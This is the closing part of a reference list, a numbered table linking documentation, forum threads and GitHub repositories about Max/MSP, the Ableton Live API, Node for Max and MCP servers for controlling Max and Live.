| 10 | Max Cookbook LiveAPI | https://music.arts.uci.edu/dobrian/maxcookbook/live-api-javascript |
| 11 | Community Tutorial | https://cycling74.com/forums/tutorial-using-the-javascript-live-api-in-max-for-live |
| 12 | MCP Server Discussion | https://cycling74.com/forums/a-mcp-model-context-protocol-server-for-max |
| 13 | Producer Pal MCP | https://cycling74.com/forums/producer-pal-mcp-server-running-in-node-for-max-to-control-ableton-live |
| 14 | MaxMSP-MCP-Server | https://github.com/tiianhk/MaxMSP-MCP-Server |
| 15 | maxmsp-mcp Extended | https://github.com/ersatzben/maxmsp-mcp |
| 16 | Producer Pal Repo | https://github.com/adamjmurray/producer-pal |
| 17 | Producer Pal Docs | https://producer-pal.org |
| 18 | Node for Max API | https://docs.cycling74.com/apiref/nodeformax/ |
| 19 | N4M Programming | https://docs.cycling74.com/max8/vignettes/07_n4m_maxapi |
| 20 | node.script Reference | https://docs.cycling74.com/reference/node.script |
| 21 | N4M vs js Differences | https://docs.cycling74.com/max8/vignettes/04_n4m_jsdifferences |
| 22 | Live Object Model | https://docs.cycling74.com/apiref/lom/ |
| 23 | Live API Overview | https://docs.cycling74.com/userguide/m4l/live_api_overview/ |
| 24 | N4M Core Examples | https://github.com/Cycling74/n4m-core-examples |
| 25 | N4M Community | https://github.com/Cycling74/n4m-community |
| 26 | MaxPy | https://github.com/Barnard-PL-Labs/MaxPy |
| 27 | shell Object | https://github.com/jeremybernstein/shell |

---

*End of reference document.*
